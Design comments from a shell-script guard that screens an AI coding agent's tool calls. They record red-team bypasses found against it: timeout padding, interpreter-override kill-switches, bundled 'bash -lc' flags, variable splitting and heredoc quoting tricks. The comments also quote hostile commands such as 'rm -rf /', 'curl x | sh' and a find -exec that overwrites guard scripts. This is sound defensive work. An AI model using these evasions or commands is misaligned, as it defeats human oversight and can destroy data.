THE HASHER IS PINNED TO ABSOLUTE PATHS, exactly as FLOOR_GREP is pinned above
and for the identical reason. floor_sha (below) resolves sha256sum/shasum by
BARE NAME through PATH; that is harmless because it runs only at SessionStart,
but a bare-name resolution on the block path is a per-tool-call CODE EXECUTION
primitive for anyone who can set PATH via a project settings.json `env` block —
and their fake sha256sum would receive, as its stdin, the very command text
this design promised never to write down. floor_sha is therefore NOT reused.
/usr/bin/shasum is LAST because it is a Perl script and an order of magnitude
slower than sha256sum — a cliff entered silently on a box lacking the first.
```

## bin/library-admission.sh, lines 980-1000 (before this edit)

```text
floor_block <guard> <message> [rule.shape] — deny the tool call: reason to
stderr (fed back to the model), one record, exit 2. The one blocking exit in
the floor.
THE RECORD IS WRITTEN AFTER BOTH printfs, never before: a logger fault must not
be able to swallow the reason the operator needs in order to argue with the
rule. And the rule id is shown to the operator, because "this rule is wrong" is
the feedback this ticket exists to collect and they cannot name a rule the
floor never told them about.

THE REMEDY PRINTED IS THE NARROWEST TRUE ONE (harbor#482). It used to be the
kill-switch for every rule, which turns all of them off to get past one. A `!`
command is not a tool call, so no guard sees it: one command, once, by the
operator. A file-tool refusal names the edit instead, made by the operator by
hand. Lint F16 keeps the blanket hatch out of every guard but the two where it
is the true remedy.

SHADOW (harbor#482): under HARBOR_ADMISSION_SHADOW=1, set by the operator at launch
like the kill-switch, a rule records `shadow` and RETURNS instead of exiting,
so the guard keeps evaluating: every would-be block is recorded, and a later
rule that stays enforcing (floor_shadow_enforces) is still reached and still
blocks. Returning 0 keeps `hit … && floor_block …` lists alive under set -e.
```

## bin/library-admission.sh, lines 1036-1052 (before this edit)

```text
floor_shadow_enforces <guard> <rule> — 0 iff this rule keeps blocking in a
shadow session. The set is what would let a shadow session make itself, or a
later session, unguarded or unrecorded, or take an act reserved to a person:
  selfedit         floor control surfaces and switch-bearing settings, file tools
  *surface*, *-cfg*, cd-bridge-*
                   the same surfaces and the config dir from a command: without
                   these a shadow session could rewrite settings.json or replace
                   the guards that are meant to keep enforcing (review of #970)
  killswitch-*     setting or persisting either switch, from a command
  startup-file-*   shell startup files, where a persisted switch would live
  api-route-*      Claude Code's own API route in settings.json
  finding-label-*  a finding disposition, which is the operator's act (#855)
The surface family is matched by the rule ids' own naming, not listed one by one;
floor.ledger-test SH-11 derives every guard-bash rule whose message names a floor
surface or the config dir and fails if one falls outside these patterns.
Everything else is measured, not enforced. guard-cloud and guard-destroy decide
through permissionDecision and do not read shadow at all (docs/explanation/admission-baseline.md).
```

## bin/library-admission.sh, lines 1062-1072 (before this edit)

```text
floor_confinement_covers <guard> <rule> — 0 iff this block is skipped because the confinement already denies its
target (harbor#1300, #555 P3): the rule is in the covered set, the call runs confined, the operator turned the skip
on, and the config dir is outside everything the sandbox lets a command write. Any doubt is 1, and the rule blocks.
The set mirrors contracts/confinement-coverage.tsv, and tests/admission/baseline/confinement.test.sh holds the two equal:
rules whose whole target is the config dir or a floor surface in it. Never a rule whose target can sit in the write
zone or above the config dir, a remote action, or a file tool (the sandbox wraps Bash alone).
NOTHING HERE IS READ FROM THE ENVIRONMENT. A project's settings `env` block reaches every hook, so the marker and the
managed file are pinned literals (tests drive a copy with them rewritten, as HOST-1 does for scutil), the marker must
be root-owned, and the skip is a line only the operator's sudo install writes (`confinement_skip` in harbor.toml):
harbor.toml itself sits inside the write zone, so a confined session could turn a skip read from there on itself.
Called on the block path only, so its forks never touch an allowed call.
```

## bin/library-admission.sh, lines 1152-1162 (before this edit)

```text
floor_ematch <text> <ERE> — 0 iff text matches the case-insensitive ERE.
Portable BSD+GNU: no \b/\s/\d (POSIX classes + explicit boundaries only), and
NO mid-pattern `^` inside an alternation — BSD grep silently never matches
that alternative, which quietly disabled several rules while they still
matched under the GNU grep an interactive shell may resolve first. The
interpreter is PINNED to the system grep for the same reason: the floor must
behave identically no matter what is early in PATH.
An INHERITED FLOOR_GREP/FLOOR_AWK is a second, undocumented kill-switch:
FLOOR_GREP=/usr/bin/false makes every rule in every guard return false while
the floor still looks installed, pinned and wired (red-team pass 8). The
override is honoured only for a real system grep; anything else is ignored.
```

## bin/library-admission.sh, lines 1164-1170 (before this edit)

```text
AND AN ALLOWLISTED PATH IS NOT AN EXECUTABLE ONE (review of harbor#341). The
allowlist alone refuses /usr/bin/false but ACCEPTS an allowlisted path that is
absent on this host — /opt/homebrew/bin/grep does not exist here — and the
interpreter then fails to launch on every call: floor_ematch returns non-zero,
every rule reads false, and the floor is off while still looking installed,
pinned and wired. Same kill-switch, reached through a different door. `-x` is
what closes it; without it the two-line allowlist is theatre.
```

## bin/library-admission.sh, lines 1176-1189 (before this edit)

```text
jq GETS THE SAME TREATMENT, AND DID NOT (measured 2026-08-25). floor_field
invoked a BARE `jq`, so it was PATH-only while grep had an absolute fallback
two lines up. A hook firing with a stripped PATH therefore lost jq while
/usr/bin/jq sat there executable — and this is the failure the comment on
floor_field calls the most dangerous in the set, because every field reads
empty and an UNWRAPPED guard then sees an empty command and allows anything.
Two live wrapper denials at 2026-08-25T05:46:27Z, one tool call across both
PreToolUse wirings, with jq present the whole time.

THE ALLOWLIST IS NOT OPTIONAL, for the reason spelled out for FLOOR_GREP: an
inherited FLOOR_JQ=/usr/bin/false would make every field read empty while the
floor still looked installed, pinned and wired — the same undocumented
kill-switch red-team pass 8 found, one interpreter to the left. The override is
honoured only for a real system jq; anything else is ignored.
```

## bin/library-admission.sh, lines 1198-1206 (before this edit)

```text
─────────────────────────────────────────────────────────────────────────────
Anti-evasion pre-pass for Bash guards (B3/B4). The recon's load-bearing
lesson (ported from safety-classifier.ts:213-356): a naive grep over the raw
command both false-POSITIVES on inert single-quoted data (echo 'rm -rf /')
and false-NEGATIVES on executed quoted args (env bash -c 'curl x | sh') and
command substitutions. floor_bash_targets normalizes one command into the
NEWLINE-joined set of strings that will actually run, and callers grep each
pattern over that set.
─────────────────────────────────────────────────────────────────────────────
```

## bin/library-admission.sh, lines 1215-1218 (before this edit)

```text
A wrapper requires a COMMAND after it. `env | curl …` is not a wrapped
command, it is a dump piped somewhere — stripping the `env` there erased
the evidence the CRED-05 rule exists to see (B7). So the next token must
start with something that could begin a command, and it is kept.
```

## bin/library-admission.sh, lines 1229-1241 (before this edit)

```text
floor_is_executor <cmd> — 0 iff the command hands a (possibly quoted) string
to an interpreter, so that quoted string is CODE, not data.
The flag test accepts BUNDLED forms (bash -lc, sh -xc, python3 -Ec): requiring
-c as its own token let `bash -lc 'curl|sh'` be classified as a non-executor,
which then had its payload treated as inert data (red-team 2026-07-24, the
highest-impact bypass — it defeated every pattern for every payload).
Deliberately PERMISSIVE: this predicate GATES whether the CODE variant is
scanned at all, so a miss is total — a live payload becomes dropped data.
Two misses were confirmed (red-team pass 2): an absolute-path interpreter
(/bin/bash -c) and a flag taking a separate value (zsh -o norc -c). Both are
fixed by (a) allowing a leading path and (b) accepting the -c/-e/-r flag
ANYWHERE after the interpreter word rather than as an unbroken flag chain.
osascript is macOS's only; the Linux forms (python, node, perl) are already listed (harbor#618).
```

## bin/library-admission.sh, lines 1249-1272 (before this edit)

```text
`sed` LEFT THIS LIST (edge pass 2026-08-29). Every other word here hands a
string to a shell; sed does not. Its quoted argument is a SED program, and a
`|` in one is a delimiter or an alternation — never a pipe. Promoting it to
CODE meant `s|rm -rf /|X|` was scanned with shell rules, where the two
delimiters read as pipeline boundaries and rm-rf-root.flat fired on an
ordinary edit to a file documenting that rule. It blocked twice while this
pass was measuring it.

NOT A WEAKENING, MEASURED RATHER THAN ARGUED. Both shapes that could have
lost cover were run against HEAD and against this file: `sed 's/x/…/e'` and
`sed -n 'w <floor surface>'` are allowed BY BOTH, so neither was coverage
this removed — they are pre-existing gaps, now recorded in docs/explanation/admission-baseline.md rather
than quietly inherited. The write that IS caught, `sed -i '' 's/a/b/'
<surface>`, still blocks after the change, because there the surface is its
own operand and the rule reads it from DATA without ever needing CODE.

sed reaches a shell through one door, GNU's `e`, so that door keeps the
promotion — as a bound on what this file will hand over, not as a claim that
the payload behind it is caught today. The first assertions written for this
change said it was; running them is what showed otherwise.

The `e` test errs toward promoting: a non-word character followed by `e` at a
word end covers `s/x/y/e`, `s|x|y|e` and a bare `e cmd`, and costs at most a
spurious promotion, which only ever adds a variant to scan.
```

## bin/library-admission.sh, lines 1289-1293 (before this edit)

```text
An inherited FLOOR_AWK/FLOOR_MAX_NORM is the same class of undocumented
kill-switch as FLOOR_GREP: pointing the first at /dev/null or the second at 0
disables the anti-evasion pre-pass for every guard, and a project-level
settings.json `env` block can set them (privsec FO-03/04/05). Only a real
normalizer inside the guard directory is honoured.
```

## bin/library-admission.sh, lines 1301-1306 (before this edit)

```text
floor_expand_vars <text> — substitute simple `NAME=value` assignments made
earlier in the SAME command. Every rule requires the dangerous token to sit
next to its verb, so splitting it into a variable defeated all of them:
  F=$HOME/.claude/settings.json; echo {} > $F     (red-team pass 3)
Bounded to 8 assignments; purely additive (the expanded copy is scanned
alongside the original, never instead of it).
```

## bin/library-admission.sh, lines 1310-1312 (before this edit)

```text
Assignments, newline-separated. Iterated with `set --` rather than a pipe
so the substitutions accumulate in THIS shell (a `while read` pipeline runs
in a subshell and every expansion was silently discarded).
```

## bin/library-admission.sh, lines 1327-1341 (before this edit)

```text
floor_expand_paths <text> — rewrite every home spelling to the absolute home
and collapse redundant slashes, so path rules match ONE canonical form.
Enumerating spellings in each regex kept failing: pass 2 covered `~/` and
`$HOME`, pass 5's re-anchoring dropped `~user/` (which the shell expands to
the same directory), and every new rule had to re-list them. Normalizing once
here is the fix that does not have to be repeated per rule (red-team pass 6).

`/x/../` JOINS `//` HERE, through the shared collapse (harbor#94, P13-fs-02).
This is the one canonical form every Bash-surface path rule reads — CFG_RE,
CFG_TOK, CFGDIR_RE, the segment-table args in floor_seg_has, the archive
destinations — and it stopped one collapse short of the file-tool guard's, so
`~/Library/../.claude/bin/admission-bash.sh` reached none of them. Fixing it in the
canonicaliser rather than in the rules is this function's whole purpose: a
`..` clause added to CFG_RE would have to be added to CFG_TOK and to every
rule written after it.
```

## bin/library-admission.sh, lines 1350-1355 (before this edit)

```text
Above this size the shell-aware normalizer is skipped. Its char loop builds
strings by concatenation, which awk implements in O(n^2): 10KB takes 85ms but
200KB takes 11.7s. A hook that exceeds its timeout is SKIPPED — so padding a
dangerous command with junk was a fail-OPEN bypass (QA plan R4, measured).
Oversized payloads fall back to scanning the RAW command: cruder, O(n), and
fail-toward-BLOCKING — padding now makes a match more likely, not less.
```

## bin/library-admission.sh, lines 1361-1382 (before this edit)

```text
floor_hd_strip_body <data-line> <raw-cmd> — echo the DATA line with the heredoc BODY
removed, or the line unchanged when that cannot be done SAFELY (harbor#302).

The false-positive class this exists for: a heredoc body is a document, and the
FLAT scanners read it as though it were the command. Measured on this box, the
floor blocked eleven pieces of ordinary work in one session on that basis — a
commit message quoting a rule name, a ticket body, a probe script, the patch for
the rule itself — every one of them defeated by writing identical bytes to a file
instead, which is the tell the ticket names.

THE OPENER LINE IS EVERYTHING BEFORE THE FIRST " ; ", because admission-normalize.awk
joins logical lines with that separator. That is what makes this decidable here
and NOT from FLOOR_SEGS: `cat <<HD | sh` puts the shell at segment 2, between the
opener and the body, with the delimiter still last, so an index walk cannot see
it. The pipe is plainly visible on the DATA line.

EVERY GUARD RETURNS THE LINE UNCHANGED. There is no path here that emits less
than today unless all three conditions hold, so the failure mode is the status
quo rather than a hole.

harbor#784: a TYPED ` ; ` is the same three bytes, so the raw opener line is
checked too (_floor_hd_line1_clean). <raw> is the command before normalizing.
```

## bin/library-admission.sh, lines 1410-1421 (before this edit)

```text
2 · THE CONSUMER IS ON AN ALLOW-LIST, NOT OFF A DENY-LIST, and that polarity is
the whole safety argument. A deny-list of interpreters is a claim about a set
you do not control, and the first draft of this proved it: it listed the
obvious shells and script engines and still missed five consumers that execute
a heredoc body while being single simple commands with no pipeline and no
surface name — a remote shell over ssh, a crontab install, an at job, a
makefile read from stdin, and a container exec. Each would have had its body
hidden from the flat scanners while still running. That is the same failure as
the executor word list which killed the previous attempt at this ticket.

So: only consumers whose stdin cannot execute and whose purpose is writing a
document to a file. Two of them. Anything else keeps being scanned.
```

## bin/library-admission.sh, lines 1427-1432 (before this edit)

```text
THERE IS DELIBERATELY NO "A REDIRECT MUST BE PRESENT" CONDITION. A draft had
one, requiring `>` on the opener. It cost `tee /tmp/f <<EOF` — which writes to a
file through its ARGUMENT, not a redirect — and bought nothing: `cat <<HD` with
no redirect prints the body to the transcript and executes none of it, and
condition 1 already refuses every pipeline, compound, background and
substitution form, so no unclassified construct survives for it to catch.
```

## bin/library-admission.sh, lines 1464-1481 (before this edit)

```text
4 · THE BODY MUST NAME NO FLOOR SURFACE, and this condition exists to KEEP a
decision rather than to close a hole. floor-test:5191 pins "a heredoc into a
FILE is live text to the flat rules whatever it spells — pinned as a pair so
the find spelling and the direct spelling cannot drift". Measured without this
condition, the strip flipped exactly one assertion — "FIND heredoc doc,
direct" from rc2 to rc0 — while its paired find spelling kept blocking, because
the -exec child is a synthesized segment the ARGV layer still reads. The two
spellings would drift, which is what the pair was written to prevent.

So a body that names the config directory keeps being read as live text. The
false-positive class this ticket is actually about — prose naming a destructive
verb, a rule token, a keychain flag — is unaffected, because none of it
mentions the config dir.

WHAT THIS DELIBERATELY DOES NOT FIX: documentation whose body quotes a path
inside the config dir still blocks, and in this repo that is ordinary work.
Fixing it means changing the pinned posture, which is a decision and not a
patch.
```

## bin/library-admission.sh, lines 1507-1509 (before this edit)

```text
Collapse repeated and dot slashes so "rm -rf //" and "rm -rf /./" read as
the root they actually resolve to — the Bash surface had no path
normalization at all, unlike the file-path guard (red-team pass 3).
```

## bin/library-admission.sh, lines 1520-1522 (before this edit)

```text
EXPD renders substitutions back in place so a rule can see `eval $( … )`
adjacency — both handlers erase `$(` from DATA/CODE, which left the
fetch-and-execute rules structurally unreachable (red-team pass 4).
```

## bin/library-admission.sh, lines 1524-1526 (before this edit)

```text
VALU renders each substitution as a guess at its OUTPUT, so an operand that
arrives via `$(printf /)` still sits next to its verb. Without it every
adjacency-based rule broke at once (red-team pass 8, critical).
```

## bin/library-admission.sh, lines 1528-1541 (before this edit)

```text
FEXEC — find's `-exec`/`-ok` children with `{}` substituted back to the
search root (admission-normalize.awk, seg_expand_find). The child is a command
find RUNS, so the flat half of the file has to see it too: `find <cfg>/bin
-name 'guard-*.sh' -exec cp /tmp/evil {} \;` has no surface next to a
mutating verb until the placeholder is resolved, and mutate-onto-surface —
which already knows that a destination-position surface is a write and a
source-position one is a backup — then answers it with no new rule.
ONE LINE PER CHILD, and that is not cosmetic: every flat rule reaches its
operand through a `[^;&|]*` span, and a span that could run out of a real
operand into a synthesized one would manufacture adjacency that the command
does not have. grep is line-oriented, so a line boundary is a wall.
The `case` runs first so a command with no find child costs no fork at all —
the same discipline floor_seg_cwd_under states: a hook that exceeds its
timeout is SKIPPED, so a fork on every call is a fail-open path.
```

## bin/library-admission.sh, lines 1555-1567 (before this edit)

```text
─────────────────────────────────────────────────────────────────────────────
H2 (harbor#4) — THE PER-SESSION CONTEXT FILE.

floor_session_context — print this session's recorded verdict, or empty.
floor_engine_stand_down — exit 0 iff a GLOBAL-ENGINE hook must not act here.

ONLY AN EXPLICIT OPT-OUT STANDS THE ENGINE DOWN (harbor#954, D-46). It read
"anything but a clear `ambient` ⇒ stand down", so a marker alone, a missing
resolver or a first-ever session all stopped the work log in every marked repo,
with nothing replacing it. Now the one signal is `worklog: off` at the top level
of the .agents/config.yaml whose marker floor_in_repo finds, honoured beside
`context: ambient` too: an owner who wrote it meant it. The session verdict no
longer decides this; floor_session_context stays for the readers of the file.
```

## bin/library-admission.sh, lines 1591-1614 (before this edit)

```text
─────────────────────────────────────────────────────────────────────────────
THE SEGMENT-TABLE API (B-rewrite, owner decision 2026-07-25).

A rule written against this asks a question about ARGV — "is some segment
running `tar` in extract mode with an argument under the config dir?" —
instead of a question about spelling — "does this string contain `tar`,
followed within N characters by a dash-prefixed group containing x, followed
by …". The second question is the one this workstream measured going wrong at
60-85% of the rate it went right.

FAIL-OPEN, deliberately and consistently with every other scanner here: if the
awk is missing, the payload is oversized, or the table is empty, every
predicate below returns "no match". The un-swallowable layer is B1's
permissions.deny, which binds the named TOOL and needs no parser at all.

  floor_seg_load "$cmd"                       # once per guard invocation
  floor_seg_cmd '^(rm|shred)$'                # a segment runs this command
  floor_seg_has '^tar$' '^-?[a-z]*x' '/\.claude'   # …AND carries these args
  floor_seg_redir '.' '/\.claude/'            # …writes there via redirection

Every pattern is an ERE matched against a WHOLE token, so `^…$` anchors mean
what they say. Argument patterns are matched against arguments AND redirect
targets: a redirect target is an operand of the segment, and `tar -xf p -C
~/.claude` and `cat k > ~/.claude/x` are the same concern.
```

## bin/library-admission.sh, lines 1627-1663 (before this edit)

```text
floor_seg_degraded — 0 iff floor_seg_load produced NO table, i.e. every
floor_seg_* rule in the calling guard is silently absent for this call.

WHY A GUARD HAS TO BE ABLE TO ASK THIS (harbor#306). floor_seg_load and
floor_bash_targets degrade in OPPOSITE directions, and only one of them is
safe. floor_bash_targets falls back to scanning the RAW command — "cruder,
O(n), and fail-toward-BLOCKING", as its own note above says. floor_seg_load
falls back to the empty string, so a segment rule that cannot be evaluated
reads as a rule that did not match. In a guard carrying BOTH layers
(guard-bash) the flat layer covers the gap. In a guard whose rules are
segment-ONLY the whole rule set evaporates with exit 0 and no output.

MEASURED 2026-08-25 against admission-destroy.sh and admission-cloud.sh, whose
deny-always tiers are segment-only. Three causes, one verdict:

  a command over FLOOR_MAX_NORM  -> SILENT ALLOW on diskutil eraseDisk
  awk absent from PATH           -> SILENT ALLOW
  admission-normalize.awk missing    -> SILENT ALLOW

with `admission-bash.sh` DENYING the padded 'rm -rf /' alongside it as the control.
The first cause needs no missing binary, no missing file and no environment
override — a trailing comment of 33,000 bytes is enough, and the same padding
makes a guard-bash match MORE likely. So the deny-always tier of a
segment-only guard was one long command away from being switched off.

THE PREDICATE DISCRIMINATES, which is the only thing that makes it usable
(No.2.10). Measured over the ordinary corpus: `ls` 2 segments, `git status` 3,
`bq query 'select 1'` 4, a three-stage pipeline 9, a heredoc commit 13 — and a
30 KB command still 3. Every parseable call yields a non-empty table; only the
three degraded causes above yield an empty one. An empty table therefore means
"could not parse", never "nothing to see".

IT IS NOT A RULE AND MUST NOT BECOME ONE. It reports that the argv layer is
blind for this call; what a guard does about that belongs to the guard, whose
tier structure knows which of its rules were load-bearing. Deciding here would
put one posture on every caller, including the ask-tier ones where fail-open is
the deliberate §2.11 choice.
```

## bin/library-admission.sh, lines 1666-1677 (before this edit)

```text
_floor_seg_ids <cmd-ERE> — the ids of segments whose command matches.
NOTE the `if` around every grep. `grep -q` returning 1 as the last command of
a loop body exits the loop 1 under `set -eu`, which killed the enclosing
pipeline and silently truncated the B8 manifest (pass 11, critical). The same
trap is one keystroke away in every function here.

ONE grep over the whole SEGC block, not two processes PER SEGMENT. The first
cut looped over every segment and forked a sed and a grep for each, so with
five floor_seg_has calls in guard-bash a 60-line build script took 2.4s
against 0.23s before, and an 8KB payload took 38s (pass 12, P12-perf-04). That
is not a comfort issue: a PreToolUse hook that exceeds its timeout is SKIPPED,
so latency IS a fail-open bypass — padding the command switches the guard off.
```

## bin/library-admission.sh, lines 1679-1697 (before this edit)

```text
CASE-INSENSITIVITY IS OPT-IN, AND THE BLANKET FORM WAS MEASURED AND REJECTED
(harbor#282). The whole flat layer is `-iEq`, so making this `-iE` too looks
like the obvious repair for the CRONTAB bypass. It is not: this helper also
resolves the shell segments floor_seg_shells_all_named_scripts counts, and one
extra case-insensitive match withdraws the harbor#222 exemption.

MEASURED over 2,000 real transcript commands: the blanket `-i` flipped exactly
one verdict, ALLOW -> BLOCK as pipe-to-shell, and bisecting the payload to
seven lines named the trigger — a heredoc commit message carrying

    a hardcoded `WIRE_POST='Read|Bash|Grep|WebFetch'`

The `|Bash` in that prose became a shell segment with no named script, the
exemption failed, and a legitimate `sh <script> | grep` pipeline was refused.
That is harbor#277's class, and this repo writes that matcher string into
commit messages constantly — so 1-in-2,000 badly understates it for real work.

So callers that mean "a command NAME, however spelled" ask for `ci`; callers
that COUNT SHELLS must not, or the exemption they feed becomes unreliable.
```

## bin/library-admission.sh, lines 1736-1740 (before this edit)

```text
floor_seg_has <cmd-ERE> [arg-ERE …] — exit 0 iff SOME ONE segment matches the
command AND carries an argument (or redirect target) for EVERY arg pattern.
"Some one" matters: the patterns must all hold of the SAME segment, which is
precisely what a flat scanner cannot express — `tar -tf a.tar; cp x ~/.claude`
satisfies both halves of the old regex across two unrelated commands.
```

## bin/library-admission.sh, lines 1744-1747 (before this edit)

```text
P13E-2: the per-segment loop below forked ~6 times per matching segment per call, so 2000 padded
'rm a' lines took the guard past the hook timeout, and a timed-out hook fails OPEN. The table path
asks each arg pattern ONCE over every segment's arguments, with the same grep and the same pattern;
the loop stays only as the fallback when that table cannot be built consistently.
```

## bin/library-admission.sh, lines 1761-1768 (before this edit)

```text
`ci` (harbor#282, PR #283 review). Every caller of this helper is asking "does
some segment RUN this command", and on a case-insensitive filesystem GCLOUD is
gcloud. Measured before widening: `gcloud projects delete` DENIED and `GCLOUD
projects delete` ALLOWED; same for `bq rm`, `git reset --hard`, `git clean
-fdx`, `diskutil eraseDisk` and `gh api --input ~/.env`. Those guards are
argv-only by design — they emit permissionDecision rather than a flat block —
so unlike guard-bash's rm/tar sites they had no case-insensitive twin to fall
back on, and the gap was a complete bypass of an ask AND of two denies.
```

## bin/library-admission.sh, lines 1772-1775 (before this edit)

```text
Each token ALSO in its canonical-path spelling, so a rule needs only the
absolute form and `~/.claude`, `$HOME/.claude` and `${HOME}/.claude` all
reach it. sed is line-oriented and every token is its own line, so this
cannot fuse two arguments into one.
```

## bin/library-admission.sh, lines 1852-1910 (before this edit)

```text
floor_heredoc_inert_only (harbor#89) — 0 iff the WHOLE command is one INERT
command consuming a heredoc, and nothing else. Deliberately narrow.

WHY IT EXISTS. Hours after the floor went live it blocked a `git commit` whose
MESSAGE quoted a destructive command as evidence the rule now catches it, then
blocked the issue filed about that, then blocked the attempt to inspect the
tokenizer. This repo's discipline is detailed records of what was blocked and
why, so the guard was taxing its own documentation.

WHY NOT "IGNORE HEREDOC BODIES". A heredoc body is data to `git commit -F -`
and EXECUTABLE to `sh`. The tokenizer folds newlines to `;`, so the body
becomes its own segment with its own command word — measured:
  git commit -F - <<EOF / <destructive> / EOF
    SEGC:1:git  SEGR:1:<:EOF  SEGC:2:<verb>  SEGC:3:EOF
  sh <<EOF / <destructive> / EOF
    SEGC:1:sh   SEGR:1:<:EOF  SEGC:2:<verb>  SEGC:3:EOF
Identical but for the consumer, which is exactly the signal.

WHY SO STRICT. The obvious predicate — "every segment's command word is
inert" — IS A BYPASS. `echo` is inert, so `echo x > <floor surface>` would
satisfy it and the floor-surface write would be waved through: the danger is
in the REDIRECT, not the command word. So this requires the command to be
EXACTLY one inert consumer, the body, and the delimiter as the LAST segment.
Anything after the delimiter — a second command, a redirect, an `&&` — and the
veto does not fire and the flat rules decide as they do today.

FAIL-CLOSED: no table, no heredoc, or an unrecognised consumer ⇒ return 1.
The inert list is an ALLOWLIST. Enumerating dangerous words instead is what
let every prefix wrapper through the egress veto's first draft.

── --publisher-inert (harbor#125) · INERTNESS IS TWO QUESTIONS ─────────────
Both guards call this and they are not asking the same thing. guard-bash asks
"could this body be EXECUTED, or written to disk here"; guard-egress asks
"could this body LEAVE the box". `gh` answers NO to the first and emphatically
YES to the second, and one flat allowlist cannot say that — which is
harbor#90's diagnosis, reached again from the other side.

The cost of the single list, measured 2026-08-22 against the installed floor:
    gh issue create --title t --body-file - <<EOF … EOF     BLOCKED
    git commit -F - <<EOF … EOF                            allowed
Same body. Filing an issue whose text quotes a blocked shape is blocked;
committing that text is not — the harbor#89 defect this function exists to
fix, surviving in the sibling verb. Four of one session's blocks landed on
documenting or measuring the floor rather than on any act against it.

WHY THE SPLIT IS SAFE, and it rests on structure rather than on trust:
guard-egress does NOT pass this flag, keeps the strict list, and judges the
same command independently. `gh gist create - <<EOF <a credential path> EOF`
still blocks there — floor-test pins it as HEREDOC-1e, and that arm is what
caught an earlier attempt to add `gh` to the shared list. Handing the flag to
guard-egress turns it red, which is the mutation that proves the split is
load-bearing rather than cosmetic.

THE SUBCOMMAND IS STILL CHECKED, because `gh` is not uniformly inert even for
execution: `gh alias set` stores a shell expansion that a later `gh <alias>`
runs — the deferred sink harbor#125 and #260 exist to close. The flag admits
`gh` only for text-consuming verbs, `alias` is excluded by OMISSION rather
than by a denylist, and an unrecognised verb falls through to today's
behaviour.
```

## bin/library-admission.sh, lines 1923-1941 (before this edit)

```text
A SYNTHESIZED SEGMENT IS NOT A POSITION IN THE COMMAND (P13-fs-06). The
find -exec children admission-normalize.awk appends get ids ABOVE every parsed
segment, so "the delimiter must be the LAST segment" started comparing the
delimiter against a child that the heredoc body merely DESCRIBES. Measured:
a git commit -F - heredoc whose BODY spells the find -exec shape went from
exit 0 to exit 2 — a commit message documenting the shape this floor just
learned to block, which is the harbor#92 false positive exactly (a rule
taxing its own evidence).
Skipped rather than renumbered: ordering is what the fold and the emitter
depend on, and this predicate asks about the structure of the command.
NO APOSTROPHES IN THIS BLOCK. The awk program is a single-quoted shell
string, so one apostrophe inside a comment ENDS it and the rest of the
program is re-parsed by the shell. Not a style rule: the first draft of
this comment carried two, and the mangled program made this veto return 0 —
exiting guard-bash at its line 58 for a command it had never judged.
Measured both ways: floor-test.sh goes to 646 passed / 510 failed, so the
suite does catch it, and lint stays at 43 rules / 0 violations, so the lint
does not. A comment is the one place in this file where prose can break the
program, and the reviewer who adds the next line here will not be told.
```

## bin/library-admission.sh, lines 1955-1965 (before this edit)

```text
Only a heredoc opened by the FIRST segment counts. A later one means the
command did something before it, and that something is not covered here.

`<<`, NOT `<` (pass 13, TOK-heredoc-inert-01 — critical). The tokenizer used
to emit the same `SEGR:1:<:` row for a heredoc and for a plain input
redirect, so this predicate matched `jq . < README ; rm -rf / ; README`:
inert command word, a `<` redirect, and a last segment whose command word
equals the target. Every clause was satisfied by an ORDINARY read, and the
veto then exited guard-bash 0 with a "rm -rf /" sitting in the middle of the
command. Measured at rc=0 — a total bypass of the guard, reached with no
heredoc at all. admission-normalize.awk now distinguishes the two operators.
```

## bin/library-admission.sh, lines 1991-1994 (before this edit)

```text
A PUBLISHER IS INERT ONLY TO THE GUARD THAT DOES NOT JUDGE PUBLICATION,
and only for a verb that consumes text. The first non-flag argument is
the subcommand. NO APOSTROPHES IN THIS BLOCK: the awk program is a
single-quoted shell string and one apostrophe ends it.
```

## bin/library-admission.sh, lines 2004-2010 (before this edit)

```text
NOTHING FOLLOWS THE HEREDOC — decided on the RAW command by _floor_hd_one_opener
(harbor#803), not on the segment table. The old segment test "the last segment word
is the delimiter" (C[MAX] == D) read the body as shell, so a lone apostrophe in a
commit message opened a quote that swallowed the terminator, moved the last segment,
and turned the veto OFF for a quoted-delimiter body — the harbor#805 false positive.
_floor_hd_one_opener parses the body the way the shell does (quotes literal, terminator
by line), so it is apostrophe-safe and strictly covers what C[MAX]==D was for.
```

## bin/library-admission.sh, lines 2155-2172 (before this edit)

```text
floor_hd_unwrap_doc_bodies [--writers] <cmd> — like floor_hd_drop_doc_bodies, but
also drops the body of a document heredoc that sits behind ONE envelope
(harbor#782): a compound opener (`mkdir … && cat > f <<EOF`) or the
`<enclosing> … $(cat <<EOF)` argument form, which is how commits and PR bodies
are written here. Self-contained: it only PEELS the envelope off line 1 and then
delegates the delicate heredoc parsing to floor_hd_drop_doc_bodies, so both
consumer/interpreter safety and the leading case stay in one place. docs/explanation/admission-baseline.md has
the rule.

WHY THE ENVELOPE IS SAFE TO PEEL. A compound prefix runs before the consumer and
never touches the body; the consumer that owns the heredoc is re-checked by the
delegate, so `x && bash <<EOF` is left judged. A `$(cat <<EOF)` prints the body
and its OUTPUT becomes an argument — harmless to a doc consumer or a
git/gh publish, executable to a shell — so the substitution arm peels ONLY when
the enclosing command word is on that allowlist, which is why `sh -c "$(…)"` and
`eval "$(…)"` are never peeled and keep blocking. A mis-split leaves an
unbalanced remainder the delegate refuses, so every ambiguous case fails toward
keeping the body judged.
```

## bin/library-admission.sh, lines 2329-2338 (before this edit)

```text
floor_hd_literalize_bodies <cmd> — <cmd> with every apostrophe and double quote INSIDE a
heredoc body replaced by a space (harbor#805). A heredoc body is not quote-parsed by the
shell, so those characters are literal there; but the normalizer reads the whole command as
one shell string with no heredoc awareness, so a lone `'` in a commit message opened a quote
that ran past the terminator and hid the body's own `$(…)` from extraction — measured:
`git commit -F - <<EOF` / `it's $(rm -rf ~)` / `EOF` reached exit 0 while the same body
without the apostrophe blocked. Command substitutions, backticks and `${`/`$[` are LEFT
intact, so an unquoted body that runs one is still judged; opener lines and everything
outside a body are untouched, so real syntax (`git commit -m "$(cat <<EOF`) is unchanged.
The veto reads the ORIGINAL (FLOOR_SEG_CMD), so delimiter quoting is detected as written.
```

## bin/library-admission.sh, lines 2388-2390 (before this edit)

```text
A command/opener line. If its quotes do not balance here (the logical line continues
onto the next physical line, e.g. an open quote past a heredoc opener — harbor#784),
body boundaries are ambiguous, so leave the WHOLE command untouched.
```

## bin/library-admission.sh, lines 2476-2524 (before this edit)

```text
floor_seg_flagval <cmd-ERE> <flag-name-ERE> <value-ERE> — exit 0 iff SOME
segment runs a matching command AND carries that flag with an adjacent VALUE
matching <value-ERE>, in either spelling: `--flag value` or `--flag=value`.

WHY ADJACENCY NEEDS ITS OWN HELPER. floor_seg_has asks only whether a token is
PRESENT in a segment, which is the right question for a verb or a switch and
the wrong one for a flag whose meaning is carried by the number after it. The
case that forced it (harbor#194, Codex review of PR #209): `bq update
